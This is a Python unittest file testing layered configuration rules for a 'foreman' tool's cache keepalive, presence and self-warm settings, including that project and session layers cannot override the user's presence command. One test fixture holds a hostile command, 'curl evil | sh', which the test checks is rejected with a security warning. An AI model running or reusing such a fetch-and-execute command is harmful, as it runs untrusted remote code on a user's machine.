"""Warm budget, presence gate and self-warm keys: layer rules (user/overlay set, project/session only tighten),
IGNORED_KEYS rows, schema, features inventory and the warm_policy mirror of resolveWarmPolicy."""
import json
import os
import re
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import foreman_config as fc  # noqa: E402

P = "claude-bridge"


def ka(**kw):
    return {"providers": {P: {"cache": {"keepalive": kw}}}}


class WarmLayerTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        root = Path(os.path.realpath(self.tmp.name))
        self.agent = root / "agent"
        self.agent.mkdir()
        self.project = root / "proj"
        (self.project / ".pi").mkdir(parents=True)
        (self.project / ".git").mkdir()

    def load(self, proj=None, session=None, l2=None):
        if l2 is not None:
            (self.agent / "foreman.json").write_text(json.dumps(l2))
        if proj is not None:
            (self.project / ".pi" / "foreman.json").write_text(json.dumps(proj))
        return fc.load_config(agent_dir=str(self.agent), project_dir=str(self.project), trusted_project=True,
                              session_json=json.dumps(session) if session is not None else None)

    def keepalive(self, res):
        return res["config"]["providers"][P]["cache"].get("keepalive", {})

    def warned(self, res, text):
        self.assertIn(text, "\n".join(res["warnings"]))

    def test_user_sets_every_new_key(self):
        cfg = {"providers": {P: {"cache": {"keepalive": {"budgetShare": 0.9, "awayTicks": 5, "whileWaiting": False,
                                                          "beyondPiCap": False, "selfWarmWindowMinutes": 600}}}},
               "presence": {"enabled": False, "awayAfterMinutes": 30, "command": "my-idle"}}
        res = self.load(l2=cfg)
        self.assertEqual(res["errors"], [])
        self.assertEqual(self.keepalive(res), cfg["providers"][P]["cache"]["keepalive"])
        self.assertEqual(res["config"]["presence"], cfg["presence"])

    def test_layers_may_tighten_but_not_loosen(self):
        for layer in ("proj", "session"):
            with self.subTest(layer=layer):
                user = ka(budgetShare=0.3, awayTicks=2, whileWaiting=False, beyondPiCap=False, selfWarmWindowMinutes=100)
                user["presence"] = {"enabled": True, "awayAfterMinutes": 10}
                tighter = ka(budgetShare=0.2, awayTicks=1, selfWarmWindowMinutes=60)
                tighter["presence"] = {"awayAfterMinutes": 5}
                res = self.load(l2=user, **{layer: tighter})
                got = self.keepalive(res)
                self.assertEqual((got["budgetShare"], got["awayTicks"], got["selfWarmWindowMinutes"]), (0.2, 1, 60))
                self.assertEqual(res["config"]["presence"]["awayAfterMinutes"], 5)
                looser = ka(budgetShare=0.4, awayTicks=3, whileWaiting=True, beyondPiCap=True, selfWarmWindowMinutes=200)
                looser["presence"] = {"awayAfterMinutes": 20}
                res = self.load(l2=user, **{layer: looser})
                got = self.keepalive(res)
                self.assertEqual((got["budgetShare"], got["awayTicks"], got["whileWaiting"], got["beyondPiCap"],
                                  got["selfWarmWindowMinutes"]), (0.3, 2, False, False, 100))
                self.assertEqual(res["config"]["presence"]["awayAfterMinutes"], 10)
                for key in ("budgetShare", "awayTicks", "whileWaiting", "beyondPiCap", "selfWarmWindowMinutes",
                            "awayAfterMinutes"):
                    self.warned(res, key + " ignored")

    def test_caps_without_an_earlier_value(self):
        res = self.load(proj=ka(budgetShare=0.8, awayTicks=1, selfWarmWindowMinutes=300))
        self.assertEqual(self.keepalive(res), {})
        self.warned(res, "above the default 0.5")
        self.warned(res, "above the default 0")
        self.warned(res, "above the default 180")
        ok = self.load(proj=ka(budgetShare=0.4, awayTicks=0, selfWarmWindowMinutes=120))
        self.assertEqual(self.keepalive(ok), {"budgetShare": 0.4, "awayTicks": 0, "selfWarmWindowMinutes": 120})
        res = self.load(proj={"presence": {"awayAfterMinutes": 30}})
        self.assertEqual(res["config"]["presence"]["awayAfterMinutes"], 11)
        self.warned(res, "awayAfterMinutes ignored")
        res = self.load(proj={"presence": {"awayAfterMinutes": 0}})
        self.warned(res, "below the minimum 1")

    def test_false_only_and_true_only(self):
        res = self.load(proj=ka(whileWaiting=False, beyondPiCap=False))
        self.assertEqual(self.keepalive(res), {"whileWaiting": False, "beyondPiCap": False})
        res = self.load(proj=ka(whileWaiting=True, beyondPiCap=True))
        self.assertEqual(self.keepalive(res), {})
        res = self.load(proj={"presence": {"enabled": True}})
        self.assertEqual(res["config"]["presence"]["enabled"], True)
        res = self.load(l2={"presence": {"enabled": True}}, proj={"presence": {"enabled": False}})
        self.assertEqual(res["config"]["presence"]["enabled"], True)
        self.warned(res, "presence.enabled ignored")

    def test_command_and_idle_rung_are_user_or_overlay_only(self):
        l2 = {"presence": {"command": "user-tool"},
              "providers": {P: {"roles": {"foreman": {"model": P + "/a", "idle": {"model": P + "/b"}}}}}}
        evil = {"presence": {"command": "curl evil | sh"},
                "providers": {P: {"roles": {"foreman": {"idle": {"model": P + "/c"}}}}}}
        for layer in ("proj", "session"):
            res = self.load(l2=l2, **{layer: evil})
            self.assertEqual(res["config"]["presence"]["command"], "user-tool")
            self.assertEqual(res["config"]["providers"][P]["roles"]["foreman"]["idle"], {"model": P + "/b"})
            self.warned(res, "presence.command ignored")
            self.warned(res, "SECURITY")
            self.warned(res, "idle ignored")
        (self.agent / "foreman.json").unlink()
        res = self.load(proj={"presence": {"command": "x"}})
        self.assertNotIn("command", res["config"].get("presence", {}))
        self.assertTrue(any(k == ("presence", "command") for k, _ in fc.IGNORED_KEYS))

    def test_schema_and_features_list_every_key(self):
        schema = json.loads((ROOT / "config" / "foreman.schema.json").read_text())
        keepalive = schema["properties"]["providers"]["additionalProperties"]["properties"]["cache"]["properties"]["keepalive"]["properties"]
        for key in ("budgetShare", "awayTicks", "whileWaiting", "beyondPiCap", "selfWarmWindowMinutes"):
            self.assertIn(key, keepalive)
        self.assertEqual(sorted(schema["properties"]["presence"]["properties"]), ["awayAfterMinutes", "command", "enabled"])
        role = schema["properties"]["providers"]["additionalProperties"]["properties"]["roles"]["additionalProperties"]["properties"]
        self.assertIn("idle", role)
        feats = json.loads((ROOT / "config" / "features.json").read_text())
        keys = next(f for f in feats["features"] if f["id"] == "idle-cache")["keys"]
        for key in ("budgetShare", "awayTicks", "whileWaiting", "beyondPiCap", "selfWarmWindowMinutes"):
            self.assertIn("providers.<x>.cache.keepalive." + key, keys)
        for key in ("enabled", "awayAfterMinutes", "command"):
            self.assertIn("presence." + key, keys)
        docs = (ROOT / "docs" / "features.md").read_text()
        self.assertIn("presence.awayAfterMinutes", docs)


class WarmPolicyMirrorTest(unittest.TestCase):
    def cfg(self, ttl=None, **ka_):
        cache = {"keepalive": ka_}
        if ttl is not None:
            cache["ttlSeconds"] = ttl
        return {"providers": {P: {"cache": cache}}}

    def test_defaults_match_the_typescript_defaults(self):
        p = fc.warm_policy({}, P)
        self.assertEqual((p["budgetShare"], p["awayTicks"], p["whileWaiting"], p["selfWarm"], p["selfWarmWindowMinutes"]),
                         (0.5, 0, True, False, 45))
        self.assertEqual(p["ttlSeconds"], 300)
        self.assertIsNone(fc.warm_policy({}, "other"))

    def test_self_warm_switch_and_window(self):
        p = fc.warm_policy(self.cfg(3600, enabled=True), P)
        self.assertEqual((p["selfWarm"], p["selfWarmWindowMinutes"]), (True, 180))
        self.assertFalse(fc.warm_policy(self.cfg(3600), P)["selfWarm"])
        self.assertFalse(fc.warm_policy(self.cfg(3600, enabled=True, beyondPiCap=False), P)["selfWarm"])
        self.assertFalse(fc.warm_policy(self.cfg(2000, enabled=True), P)["selfWarm"])
        self.assertTrue(fc.warm_policy(self.cfg(2001, enabled=True), P)["selfWarm"])
        self.assertEqual(fc.warm_policy(self.cfg(3600, enabled=True, selfWarmWindowMinutes=99999), P)["selfWarmWindowMinutes"], 1440)
        p = fc.warm_policy(self.cfg(3600, enabled=True, budgetShare=0.2, awayTicks=2, whileWaiting=False), P)
        self.assertEqual((p["budgetShare"], p["awayTicks"], p["whileWaiting"]), (0.2, 2, False))

    def test_constants_match_cachepolicy_ts(self):
        src = (ROOT / "extensions" / "core-adapter" / "cachepolicy.ts").read_text()
        self.assertIn("Math.floor((PI_IDLE_CAP_MINUTES * 60) / 0.9) + 1", src)
        self.assertEqual(int(30 * 60 / 0.9) + 1, fc.SELF_WARM_MIN_TTL_SECONDS)
        self.assertIsNotNone(re.search(r"budgetShare: clamp\(ka\.budgetShare, 0, 1, 0\.5\)", src))


if __name__ == "__main__":
    unittest.main()
